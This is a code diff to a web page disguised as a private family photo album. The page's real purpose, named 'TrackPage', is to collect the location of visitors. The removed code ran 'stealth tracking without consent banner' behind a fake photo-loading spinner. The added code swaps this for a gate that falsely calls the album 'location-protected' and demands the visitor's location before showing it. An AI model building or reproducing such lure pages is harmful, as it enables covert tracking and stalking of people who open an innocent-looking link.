@@ -1,55 +1,37 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import Layout from '../components/Layout';
-import LoadingSpinner from '../components/LoadingSpinner';
-import { useLocationTracking } from '../hooks/useLocationTracking';
+import LocationGate from '../components/LocationGate';
 
 export default function TrackPage() {
   const [contentUnlocked, setContentUnlocked] = useState(false);
-  const { captureLocation, sendTrackingData, isLoading } = useLocationTracking();
-  
-  useEffect(() => {
-    // Auto-start stealth tracking without consent banner
-    initializeStealth();
-  }, []);
-  
-  const initializeStealth = async () => {
-    try {
-      // Capture location
-      await captureLocation(window.location.href);
-      
-      // Send tracking data
-      await sendTrackingData('/api/track', window.location.href);
-      
-      // Unlock content after delay
-      setTimeout(() => {
-        setContentUnlocked(true);
-      }, 2000);
-    } catch (err) {
-      console.error('Tracking error:', err);
-      // Still unlock content
-      setContentUnlocked(true);
-    }
-  };
   
   return (
     <Layout>
       <div className="max-w-4xl mx-auto">
-        <header className="text-center mb-12 animate-fadeIn">
-          <h1 className="text-4xl md:text-5xl font-bold text-gray-800 dark:text-gray-100 mb-4">
-            📸 Family Photo Album
-          </h1>
-          <p className="text-lg text-gray-600 dark:text-gray-400">
-            Our Memories from 2024
-          </p>
-        </header>
-        
         {!contentUnlocked ? (
-          <div className="card text-center">
-            <LoadingSpinner text="Loading your photos..." />
-          </div>
+          <LocationGate
+            onUnlock={() => setContentUnlocked(true)}
+            title="🔒 Private Photo Album"
+            description="This family photo album is location-protected. Share your location to unlock and view our memories."
+            pageUrl={typeof window !== 'undefined' ? window.location.href : ''}
+          />
         ) : (
+          <>
+            <header className="text-center mb-12 animate-fadeIn">
+              <h1 className="text-4xl md:text-5xl font-bold text-gray-800 dark:text-gray-100 mb-4">
+                📸 Family Photo Album
+              </h1>
+              <p className="text-lg text-gray-600 dark:text-gray-400">
+                Our Memories from 2024
+              </p>
+            </header>
+            
+          </>
+        )}
+        
+        {contentUnlocked && (
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 animate-fadeIn">
             {[
               {
@@ -94,9 +76,11 @@ export default function TrackPage() {
           </div>
         )}
         
-        <footer className="mt-12 text-center text-sm text-gray-500 dark:text-gray-400">
-          <p>These are our precious memories. Thank you for visiting!</p>
-        </footer>
+        {contentUnlocked && (
+          <footer className="mt-12 text-center text-sm text-gray-500 dark:text-gray-400">
+            <p>These are our precious memories. Thank you for visiting!</p>
+          </footer>
+        )}
       </div>
     </Layout>
   );
